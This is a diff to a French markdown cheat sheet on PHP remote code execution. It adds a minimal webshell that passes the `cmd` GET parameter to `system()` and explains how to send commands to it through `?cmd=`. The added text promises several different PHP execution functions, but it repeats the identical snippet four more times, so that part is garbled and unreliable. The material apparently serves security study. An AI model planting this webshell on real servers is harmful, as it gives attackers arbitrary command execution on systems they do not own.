@@ -20,7 +20,23 @@
 
 ## RCE
 
-Le code PHP suivant permet un RCE :
+PHP possède plusieurs fonctions qui permettent d'exécuter des commandes. Les codes PHP suivants permet d'avoir un webshell très simple en utilisant les principaux fonctions de PHP :
+
+```php
+<?php echo "Shell";system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo "Shell";system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo "Shell";system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo "Shell";system($_GET['cmd']); ?>
+```
 
 ```php
 <?php echo "Shell";system($_GET['cmd']); ?>
@@ -28,7 +44,7 @@ Le code PHP suivant permet un RCE :
 
 Si on accédant à ce fichier, le mot Shell apparaît, il y a de grandes chances que le code a été exécuté côté serveur.
 
-Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité.
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. Lacommande dépendra du serveur (Windows ou Linux).
 
 [Web Shells 101 Using PHP (Web Shells Part 2) | Acunetix](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)
 
